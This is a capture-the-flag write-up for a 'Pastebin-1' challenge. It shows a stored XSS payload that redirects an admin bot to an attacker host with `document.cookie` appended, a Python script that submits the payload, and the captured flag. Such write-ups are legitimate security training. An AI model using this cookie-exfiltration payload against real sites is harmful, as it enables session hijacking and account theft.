# Pastebin-1

The pastebin page is vulnerable to xss attack. For some reason fetch didn't work so I used redirect to get admin cookies. 

With the following payload I was able to redirect with the admin cookie included. 
```javascript
<script>window.location.href = "{lhost}/"+document.cookie</script>
```

Small script to automate the process. 
```python
import requests
import sys

lhost = sys.argv[1]

payload = f'<script>window.location.href = "{lhost}/"+document.cookie</script>'
print(payload)
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
print("[+] Sending xss-payload")
xss = requests.post("https://pastebin-1.mc.ax/create", data={"content": payload})

print("[+] Fetching pastebin-url")
print(xss.url)
print("[+] Enter that url in https://admin-bot.mc.ax/pastebin-1")

```

Admin-bot page has a recaptcha so, the url has to be entered manually. 

When I entered the url, my ngrok server got back a response with the flag:
`GET /flag=flag{d1dn7_n33d_70_b3_1n_ru57}`

### Flag
flag{d1dn7_n33d_70_b3_1n_ru57}